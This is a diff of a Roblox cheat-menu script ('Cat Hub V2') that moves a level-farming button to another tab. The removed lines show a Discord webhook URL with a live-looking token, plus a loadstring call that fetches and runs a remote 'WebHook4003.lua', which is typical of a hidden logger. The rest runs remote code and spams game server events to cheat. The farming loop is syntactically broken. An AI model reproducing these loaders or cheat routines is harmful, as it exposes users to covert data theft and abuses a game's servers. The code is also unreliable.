@@ -1,25 +1,5 @@
-getgenv().WebhookHere =
-"https://discord.com/api/webhooks/1071171596984783000/LLu6avixwrKfaPZuF6VN5aWZxLgagb4cSqyc6HGpD8VnclLCLOb0JXxfEvkx-eSXOExu"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
-
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Cat Hub V2 | This Gui Made By Cat#2728", "DarkTheme")
-
-Main = Window:NewTab("Haki")
-local MainSection = Main:NewSection("Haki Farm")
-MainSection:NewButton("Haki levels", "Grinds ur haki level", function(state)
-local pl = tostring(game:GetService("Players").LocalPlayer.UserId)
-local lv = game:GetService("Workspace").UserData["User_"..pl].Data.HakiLevel.Value
-for i = 1,25 do
-while wait() do
-workspace.UserData["User_"..pl].III:FireServer("On", lv)
-wait()
-workspace.UserData["User_"..pl].III:FireServer("On", lv)
-wait()
-workspace.UserData["User_"..pl].III:FireServer("Off", lv)
-wait()
-workspace.UserData["User_"..pl].III:FireServer("Off", lv) 
-end)
 
 Main = Window:NewTab("Npc")
 local MainSection = Main:NewSection("Npc Stuff")
@@ -216,6 +196,20 @@ end)
 
 local Main = Window:NewTab("Misc")
 local MainSection = Main:NewSection("Random Stuffs")
+
+MainSection:NewButton("Haki levels", "Grinds ur haki level", function(state)
+local pl = tostring(game:GetService("Players").LocalPlayer.UserId)
+local lv = game:GetService("Workspace").UserData["User_"..pl].Data.HakiLevel.Value
+for i = 1,25 do
+while wait() do
+workspace.UserData["User_"..pl].III:FireServer("On", lv)
+wait()
+workspace.UserData["User_"..pl].III:FireServer("On", lv)
+wait()
+workspace.UserData["User_"..pl].III:FireServer("Off", lv)
+wait()
+workspace.UserData["User_"..pl].III:FireServer("Off", lv) 
+end)
 
 MainSection:NewButton("Go to compass", "go to compass", function() 
 local CharacterName = game.Players.LocalPlayer.Character
